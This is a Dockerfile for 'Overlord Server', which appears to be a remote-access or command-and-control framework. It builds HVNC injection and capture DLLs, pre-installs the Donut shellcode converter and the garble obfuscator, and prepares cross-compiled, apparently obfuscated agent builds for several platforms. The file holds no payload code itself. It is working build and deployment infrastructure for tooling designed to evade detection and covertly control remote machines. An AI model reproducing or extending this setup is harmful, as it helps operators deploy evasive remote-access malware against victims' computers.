# syntax=docker/dockerfile:1.7
# Overlord Server Dockerfile (multi-stage)
#
# Stage 1 (builder): full apt toolchain to compile assets + HVNC DLLs.
# Stage 2 (runtime, slim): only what the server needs at startup. Cross-compile
# toolchains (mingw, aarch64/armv7/musl, Android NDK, ldid, UPX) are downloaded
# on first agent build by Overlord-Server/src/server/toolchain-manager.ts and
# cached in the persistent /app/data volume.

# ============================================================
# Stage 1: builder
# ============================================================
FROM oven/bun:1 AS builder
WORKDIR /app

RUN --mount=type=cache,target=/var/cache/apt,sharing=locked \
    --mount=type=cache,target=/var/lib/apt,sharing=locked \
    apt-get update && apt-get install -y --no-install-recommends \
        build-essential \
        gcc-mingw-w64-x86-64 \
        g++-mingw-w64-x86-64 \
        gcc-mingw-w64-i686 \
        ca-certificates \
        wget \
        curl \
        git \
        unzip \
        zip

ENV GO_VERSION=1.26.2
ARG TARGETARCH
RUN case "${TARGETARCH:-amd64}" in \
        amd64) GO_ARCH=amd64 ;; \
        arm64) GO_ARCH=arm64 ;; \
        *) echo "Unsupported architecture: ${TARGETARCH}" >&2; exit 1 ;; \
    esac \
    && wget -q "https://go.dev/dl/go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" \
    && tar -C /usr/local -xzf "go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" \
    && rm "go${GO_VERSION}.linux-${GO_ARCH}.tar.gz" \
    && rm -rf /usr/local/go/test /usr/local/go/api /usr/local/go/doc /usr/local/go/misc

ENV PATH="/usr/local/go/bin:/go/bin:${PATH}"
ENV GOPATH="/go"
ENV GOCACHE=/root/.cache/go-build
ENV GOMODCACHE=/go/pkg/mod

RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    go install mvdan.cc/garble@latest

# Pre-fetch the latest Donut shellcode converter binary.
# The runtime donut-manager will re-check GitHub and update automatically;
# this step just ensures a working binary is available offline / on first use.
RUN DONUT_TAG=$(curl -sSf "https://api.github.com/repos/TheWover/donut/releases/latest" \
        | grep '"tag_name"' | head -1 | cut -d'"' -f4) \
    && ARCHIVE_URL="https://github.com/TheWover/donut/releases/download/${DONUT_TAG}/donut_${DONUT_TAG}.tar.gz" \
    && if curl -sSfL "${ARCHIVE_URL}" | tar xzf - --strip-components=0 -C /usr/local/bin ./donut 2>/dev/null; then \
        chmod +x /usr/local/bin/donut; \
        echo "Donut ${DONUT_TAG} pre-installed from archive"; \
    else \
        echo "WARNING: Donut pre-fetch failed — will fall back to system PATH or download on first use"; \
    fi

# Full bun install (includes devDeps needed for tailwind / vendor / minify steps)
COPY Overlord-Server/package.json Overlord-Server/bun.lock* ./
RUN --mount=type=cache,target=/root/.bun/install/cache \
    bun install --frozen-lockfile

# Server source (Overlord-Server/dist-clients may carry pre-built MSVC DLLs from CI)
COPY Overlord-Server/ ./

# HVNC sources for the cross-compile fallback (used only if no pre-built MSVC DLL).
COPY HVNCInjection/ ./HVNCInjection/
COPY build-hvnc-dll.sh ./build-hvnc-dll.sh
COPY HVNCCapture/ ./HVNCCapture/
COPY build-hvnc-capture-dll.sh ./build-hvnc-capture-dll.sh

RUN mkdir -p dist-clients && \
    if [ -f dist-clients/HVNCInjection.x64.dll ]; then \
      echo "Using pre-built MSVC HVNCInjection DLL"; \
    else \
      chmod +x build-hvnc-dll.sh && \
      HVNC_SRC_DIR=HVNCInjection/src HVNC_OUT_DIR=dist-clients bash build-hvnc-dll.sh || \
      echo "WARNING: HVNCInjection DLL not available (build with MSVC on Windows)"; \
    fi

RUN if [ -f dist-clients/HVNCCapture.x64.dll ]; then \
      echo "Using pre-built MSVC HVNCCapture DLL"; \
    else \
      chmod +x build-hvnc-capture-dll.sh && \
      HVNC_CAPTURE_SRC_DIR=HVNCCapture/src HVNC_CAPTURE_OUT_DIR=dist-clients bash build-hvnc-capture-dll.sh || \
      echo "WARNING: HVNCCapture DLL not available (build with MSVC on Windows)"; \
    fi

# Tailwind CSS + vendored frontend assets
RUN bun run build:css && bun run vendor \
    && test -s ./public/assets/tailwind.css && test -d ./public/vendor/fontawesome


# ============================================================
# Stage 2: runtime (slim)
# ============================================================
FROM oven/bun:1-slim AS runtime
WORKDIR /app

# openssl/ca-certificates: TLS cert generation + HTTPS validation.
# wget/tar/unzip/xz-utils: required by toolchain-manager for on-demand downloads.
# clang: fallback C compiler for darwin/CGO agent builds (no toolchain mapping in
# toolchain-manager.ts, so build-process.ts falls back to the default `cc`).
RUN --mount=type=cache,target=/var/cache/apt,sharing=locked \
    --mount=type=cache,target=/var/lib/apt,sharing=locked \
    apt-get update && apt-get install -y --no-install-recommends \
        openssl \
        ca-certificates \
        wget \
        tar \
        unzip \
        xz-utils \
        git \
        clang \
    && rm -rf /var/lib/apt/lists/*

# Reuse Go + garble from the builder so we don't re-download.
COPY --from=builder /usr/local/go /usr/local/go
COPY --from=builder /go/bin/garble /go/bin/garble

ENV PATH="/usr/local/go/bin:/go/bin:${PATH}"
ENV GOPATH="/go"
ENV GOCACHE=/root/.cache/go-build
ENV GOMODCACHE=/go/pkg/mod

# Production-only node_modules (drops tailwind, terser, postcss, typescript, ...).
COPY Overlord-Server/package.json Overlord-Server/bun.lock* ./
RUN --mount=type=cache,target=/root/.bun/install/cache \
    bun install --production --frozen-lockfile

# Server source.
COPY Overlord-Server/ ./

# Built artifacts from the builder stage (overwrites anything from the source copy).
COPY --from=builder /app/public ./public
COPY --from=builder /app/dist-clients ./dist-clients

# Go agent source needed at every agent build.
COPY Overlord-Client/ ./Overlord-Client/

RUN mkdir -p certs data

# Pre-seed Go module cache so first agent builds work offline.
RUN --mount=type=cache,target=/root/.cache/go-build \
    --mount=type=cache,target=/go/pkg/mod \
    cd /app/Overlord-Client && \
    GOWORK=off \
    GOMODCACHE=/go/pkg/mod \
    go mod download

EXPOSE 5173

ENV PORT=5173
ENV HOST=0.0.0.0
ENV DATA_DIR=/app/data
ENV NODE_ENV=production
ENV OVERLORD_ROOT=/app
ENV NODE_PATH=/app/node_modules

# NOTE: We intentionally do NOT use `bun build --compile` here.
# The compiled standalone binary runs from a virtual bunfs filesystem that
# cannot reliably load native modules like `sharp` from /app/node_modules.
CMD ["bun", "run", "src/index.ts"]
